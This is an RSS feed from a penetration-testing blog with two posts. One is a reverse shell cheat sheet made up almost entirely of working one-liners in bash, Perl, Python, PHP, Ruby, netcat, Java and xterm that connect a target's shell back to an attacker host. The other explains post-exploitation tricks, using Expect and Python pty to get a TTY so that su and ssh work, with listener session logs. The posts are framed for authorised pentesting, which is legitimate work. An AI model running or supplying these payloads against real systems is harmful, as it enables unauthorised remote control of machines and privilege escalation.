<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>python &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/python/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Wed, 25 Jan 2012 21:09:43 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Reverse Shell Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 04 Sep 2011 15:50:49 +0000</pubDate>
				<category><![CDATA[Shells]]></category>
		<category><![CDATA[bash]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[netcat]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[php]]></category>
		<category><![CDATA[python]]></category>
		<category><![CDATA[reverseshell]]></category>
		<category><![CDATA[ruby]]></category>
		<category><![CDATA[xterm]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=175</guid>

					<description><![CDATA[If you&#8217;re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you&#8217;ll probably want an interactive shell. If it&#8217;s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>If you&#8217;re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you&#8217;ll probably want an interactive shell.</p>
<p>If it&#8217;s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.  This page deals with the former.</p>
<p>Your options for creating a reverse shell are limited by the scripting languages installed on the target system &#8211; though you could probably upload a binary program too if you&#8217;re suitably well prepared.</p>
<p>The examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute &#8220;/bin/sh -i&#8221; with &#8220;cmd.exe&#8221;.</p>
<p>Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they&#8217;re quite short lines, but not very readable.</p>
<h3>Bash</h3>
<p>Some versions of <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">bash can send you a reverse shell</a> (this was tested on Ubuntu 10.10):</p>
<pre>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</pre>
<h3>PERL</h3>
<p>Here&#8217;s a shorter, feature-free version of the <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a>:</p>
<pre>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</pre>
<p>There&#8217;s also an <a href="http://www.plenz.com/reverseshell">alternative PERL revere shell here</a>.</p>
<h3>Python</h3>
<p>This was tested under Linux / Python 2.7:</p>
<pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
<h3>PHP</h3>
<p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn&#8217;t work, try 4, 5, 6&#8230;</p>
<pre>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
<p>If you want a .php file to upload, see the more featureful and robust <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a>.</p>
<h3>Ruby</h3>
<pre>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</pre>
<h3>Netcat</h3>
<p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don&#8217;t support the -e option.</p>
<pre>nc -e /bin/sh 10.0.0.1 1234</pre>
<p>If you have the wrong version of netcat installed, <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498">Jeff Price points out here</a> that you might still be able to get your reverse shell back like this:</p>
<pre>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</pre>
<h3>Java</h3>
<pre>r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()</pre>
<p>[Untested submission from anonymous reader]</p>
<h3>xterm</h3>
<p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<pre>xterm -display 10.0.0.1:1</pre>
<p>To catch the incoming xterm, start an X-Server (:1 &#8211; which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>
<pre>Xnest :1</pre>
<p>You&#8217;ll need to authorise the target to connect to you (command also run on your host):</p>
<pre>xhost +targetip</pre>
<h3>Further Reading</h3>
<p>Also check out <a href="http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html">Bernardo&#8217;s Reverse Shell One-Liners</a>.  He has some alternative approaches and doesn&#8217;t rely on /bin/sh for his Ruby reverse shell.</p>
<p>There&#8217;s a <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-122387">reverse shell written in gawk over here</a>.  Gawk is not something that I&#8217;ve ever used myself.  However, it seems to get installed by default quite often, so is exactly the sort of language pentesters might want to use for reverse shells.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Post-Exploitation Without A TTY</title>
		<link>https://pentestmonkey.net/blog/post-exploitation-without-a-tty</link>
					<comments>https://pentestmonkey.net/blog/post-exploitation-without-a-tty#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Wed, 16 Jan 2008 22:08:59 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[expect]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[python]]></category>
		<category><![CDATA[tty]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=35</guid>

					<description><![CDATA[This is a follow-up to a topic I touched on breifly before when I talked about the problem of trying to use the SSH client when you don&#8217;t have a TTY.  I was recently in a position where I got an interactive shell on a box, discovered the root password but was unable to get [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This is a follow-up to a topic I touched on breifly <a href="http://pentestmonkey.net/blog/ssh-with-no-tty/">before</a> when I talked about the problem of trying to use the SSH client when you don&#8217;t have a TTY.  I was recently in a position where I got an interactive shell on a box, discovered the root password but was unable to get root because I couldn&#8217;t run &#8220;login&#8221; or &#8220;su&#8221;.  Both of these required a TTY in order to work.</p>
<p>I don&#8217;t present a definitive solution in this problem (if you have one please sent it in!).  However I discuss a couple of approaches to getting a TTY&#8230;</p>
<p><span id="more-35"></span></p>
<p>Post-exploitation activities during a pentest may involve using &#8220;su&#8221; to try and log into other local accounts, or using &#8220;ssh&#8221; to log into other hosts.</p>
<h3>Using &#8220;Expect&#8221; To Get A TTY</h3>
<p>If you&#8217;re lucky enough to have the <a href="http://en.wikipedia.org/wiki/Expect">Expect</a> language installed just a few lines of code will get you a good enough TTY to run useful tools such as &#8220;ssh&#8221;, &#8220;su&#8221; and &#8220;login&#8221;.</p>
<pre>$ cat sh.exp
#!/usr/bin/expect
# Spawn a shell, then allow the user to interact with it.
# The new shell will have a good enough TTY to run tools like ssh, su and login
spawn sh
interact</pre>
<p>The following output taken from a <a href="http://pentestmonkey.net/tools/php-reverse-shell/">reverse shell</a> demonstrates how &#8220;su&#8221; doesn&#8217;t work until we use the Expect script:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48257
sh: no job control in this shell
sh-3.2$ su -
su: must be run from a terminal
sh-3.2$ expect sh.exp
spawn sh
sh-3.2$ su -
Password:  mypassword
localhost ~ #</pre>
<p>Likewise, the ssh client doesn&#8217;t seem to work properly (with or without the -T option):</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33250
sh: no job control in this shell
sh-3.2$ ssh localhost
Pseudo-terminal will not be allocated because stdin is not a terminal.
&lt;big pause&gt;</pre>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33252
sh: no job control in this shell
sh-3.2$ ssh -T localhost
&lt;big pause&gt;</pre>
<p>After we run sh.exp we are able to use the ssh client as normal:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43498
sh: no job control in this shell
sh-3.2$ expect sh.exp
spawn sh
sh-3.2$ ssh localhost
ssh localhost
Password: mypassword
Last login: Wed Jan 16 13:43:20 2008 from 127.0.0.1

user@localhost ~ $</pre>
<h3>Using Python To Get A TTY</h3>
<p>This is quite an elegant solution I found on <a href="http://tero.marttila.de/">Tero&#8217;s glob</a>.  It should be effective against gentoo systems at least because the gentoo package management runs on python.</p>
<p>$ nc -v -n -l -p 1234<br />
listening on [any] 1234 &#8230;<br />
sh: no job control in this shell<br />
sh-3.2$ su &#8211;<br />
su: must be run from a terminal<br />
sh-3.2$ python -c &#8216;import pty; pty.spawn(&#8220;/bin/sh&#8221;)&#8217;<br />
sh-3.2$ su &#8211;<br />
su &#8211;<br />
Password:<br />
localhost ~ #</p>
<h3>Using PERL To Get A TTY</h3>
<p>This is not such as great solution as IO::Pty isn&#8217;t installed by default on any system I&#8217;ve seen.  For completeness, though:</p>
<p>&lt;hmmm&#8230; can&#8217;t get it will working.  Will post later.&gt;</p>
<pre></pre>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/post-exploitation-without-a-tty/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
